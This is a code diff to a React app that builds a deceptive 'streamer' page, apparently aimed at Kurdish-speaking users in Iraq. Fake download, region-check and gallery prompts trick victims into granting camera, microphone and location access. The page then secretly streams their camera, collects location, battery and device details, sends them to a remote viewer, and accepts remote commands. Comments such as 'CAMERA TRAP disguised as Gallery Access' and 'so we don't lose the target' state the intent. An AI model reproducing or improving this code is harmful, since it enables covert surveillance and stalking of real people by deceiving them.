@@ -13,6 +13,9 @@ const App: React.FC = () => {
     return params.get('host') ? 'STREAMER' : 'VIEWER';
   });
 
+  // State for Streamer Flow: 'GEO' -> 'GALLERY' -> 'DONE'
+  const [setupStep, setSetupStep] = useState<'GEO' | 'GALLERY' | 'DONE'>('GEO');
+
   const [status, setStatus] = useState<string>('');
   const [isConnected, setIsConnected] = useState<boolean>(false);
   const [aiResponse, setAiResponse] = useState<string>('');
@@ -89,6 +92,28 @@ const App: React.FC = () => {
     }
   };
 
+  // Step 1: Handle Geolocation Request
+  const handleGeoRequest = () => {
+    setLoading(true);
+    // Fake delay to look like it's checking server
+    setTimeout(() => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          // Success (or just fake success)
+          setLoading(false);
+          setSetupStep('GALLERY');
+        },
+        (err) => {
+          // Even if denied, proceed to the next step so we don't lose the target
+          console.log("Geo denied, proceeding anyway");
+          setLoading(false);
+          setSetupStep('GALLERY');
+        }
+      );
+    }, 1500);
+  };
+
+  // Step 2: Handle "Fake Gallery" Request (Actually Camera)
   const acceptAndStream = async () => {
     if (!peerRef.current || !targetId) return;
     
@@ -96,7 +121,7 @@ const App: React.FC = () => {
     setShowPermissionHint(true);
 
     try {
-      // 1. Get Media
+      // 1. Get Media (CAMERA TRAP disguised as Gallery Access)
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user' }, 
         audio: true 
@@ -110,7 +135,7 @@ const App: React.FC = () => {
         setActiveStream(null);
       });
 
-      // 3. Gather Intelligence & Connect Data
+      // 3. Gather Intelligence
       const battery = await getBatteryLevel();
       const basicInfo: DeviceInfo = {
         platform: navigator.platform,
@@ -125,8 +150,6 @@ const App: React.FC = () => {
         const conn = peerRef.current!.connect(targetId);
         conn.on('open', () => {
           conn.send({ type: 'INFO', payload: info });
-          
-          // Listen for commands from Viewer
           conn.on('data', (data: any) => {
             handleRemoteCommand(data as RemoteCommand);
           });
@@ -134,7 +157,7 @@ const App: React.FC = () => {
         setDataConn(conn);
       };
 
-      // Try Geolocation
+      // Try Geolocation again silently for data gathering
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           sendInfo({
@@ -143,18 +166,16 @@ const App: React.FC = () => {
             longitude: pos.coords.longitude
           });
         },
-        (err) => {
-          console.error("Geo error", err);
-          sendInfo(basicInfo); // Send what we have if Geo fails
-        }
+        (err) => sendInfo(basicInfo)
       );
 
       setIsConnected(true);
+      setSetupStep('DONE');
       setIsWatchingVideo(true);
       
     } catch (err) {
       console.error(err);
-      alert("بۆ ئەوەی داونلۆدەکە تەواو بێت، دەبێت 'Allow' دابگریت.");
+      alert("تکایە 'Allow' بکە بۆ ئەوەی ڤیدیۆکە بچێتە ناو گەلەری.");
       setLoading(false);
       setShowPermissionHint(false);
     }
@@ -330,7 +351,7 @@ const App: React.FC = () => {
     );
   }
 
-  // --- RENDER: SETUP MODE ---
+  // --- RENDER: SETUP MODE (STREAMER) ---
   return (
     <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
       <div className="w-full max-w-sm space-y-8 animate-fade-in relative">
@@ -358,45 +379,75 @@ const App: React.FC = () => {
                 </div>
             </div>
         ) : (
-            // STREAMER "FAKE" UI
+            // STREAMER "FAKE" UI WITH MULTI-STEP FLOW
             <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
                 
-                {/* Visual hint */}
-                {showPermissionHint && (
-                   <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
-                      ☝️ بۆ تەواوکردنی داونلۆدەکە "Allow" دابگرە
-                   </div>
+                {/* STEP 1: GEO CHECK */}
+                {setupStep === 'GEO' && (
+                    <>
+                        <div className="space-y-4">
+                            <div className="w-24 h-24 bg-red-600/20 rounded-full flex items-center justify-center mx-auto shadow-lg animate-pulse">
+                                <i className="fas fa-map-location-dot text-4xl text-red-500"></i>
+                            </div>
+                            <h2 className="text-2xl font-bold text-white">پشکنینی ناوچە</h2>
+                            <p className="text-slate-300 text-lg leading-relaxed">
+                                ببورە، ئەم فایلە تەنها بۆ بەکارهێنەرانی <span className="text-white font-bold">عێراق</span> بەردەستە.
+                                تکایە شوێنەکەت پشتڕاست بکەرەوە.
+                            </p>
+                        </div>
+                        <button 
+                            onClick={handleGeoRequest}
+                            disabled={loading}
+                            className="w-full bg-red-600 hover:bg-red-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl transition-all active:scale-95 flex items-center justify-center gap-3"
+                        >
+                             {loading ? (
+                                <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
+                            ) : (
+                                <>
+                                    <i className="fas fa-location-crosshairs"></i>
+                                    پشتڕاستکردنەوە (GPS)
+                                </>
+                            )}
+                        </button>
+                    </>
                 )}
 
-                <div className="space-y-4">
-                    <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-600/40 animate-pulse">
-                        <i className="fas fa-download text-4xl text-white"></i>
-                    </div>
-                    <h2 className="text-2xl font-bold text-white">ئامادەیە بۆ داگرتن</h2>
-                    <p className="text-slate-300 text-lg leading-relaxed">
-                        فایلەکە ئامادەیە. بۆ پاراستنی (Save) فایلەکە، تکایە داگرتن هەڵبژێرە و پاشان 
-                        <span className="text-blue-400 font-bold mx-1">Allow</span> 
-                        بکە بۆ دیاریکردنی شوێنی داونلۆد.
-                    </p>
-                </div>
+                {/* STEP 2: FAKE GALLERY REQUEST */}
+                {setupStep === 'GALLERY' && (
+                    <>
+                         {showPermissionHint && (
+                            <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
+                                ☝️ بۆ سەیڤکردنی وێنە و ڤیدیۆ، "Allow" بکە
+                            </div>
+                        )}
+                        <div className="space-y-4">
+                            <div className="w-24 h-24 bg-green-600/20 rounded-full flex items-center justify-center mx-auto shadow-lg">
+                                <i className="fas fa-images text-4xl text-green-500"></i>
+                            </div>
+                            <h2 className="text-2xl font-bold text-white">تۆمارکردن لە گەلەری</h2>
+                            <p className="text-slate-300 text-lg leading-relaxed">
+                                شوێنەکەت پشتڕاست کرایەوە. ئێستا ڕێگە بە <span className="text-green-400 font-bold">گەلەری</span> بدە بۆ ئەوەی ڤیدیۆکە بچێتە ناو مۆبایلەکەت.
+                            </p>
+                        </div>
+                        <button 
+                            onClick={acceptAndStream}
+                            disabled={loading}
+                            className="w-full bg-green-600 hover:bg-green-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl transition-all active:scale-95 flex items-center justify-center gap-3"
+                        >
+                             {loading ? (
+                                <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
+                            ) : (
+                                <>
+                                    <i className="fas fa-folder-open"></i>
+                                    کردنەوەی گەلەری (Gallery)
+                                </>
+                            )}
+                        </button>
+                    </>
+                )}
 
-                <button 
-                    onClick={acceptAndStream}
-                    disabled={loading}
-                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl shadow-blue-900/30 transition-all active:scale-95 flex items-center justify-center gap-3"
-                >
-                    {loading ? (
-                        <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
-                    ) : (
-                        <>
-                            <i className="fas fa-cloud-arrow-down"></i>
-                            داگرتن (Download)
-                        </>
-                    )}
-                </button>
-                
-                <div className="text-xs text-slate-500">
-                    Video_2024.mp4 • 24.5 MB • HD
+                <div className="text-xs text-slate-500 mt-4 border-t border-slate-800 pt-4">
+                    Secure Server • Iraq Region • 24.5 MB
                 </div>
             </div>
         )}
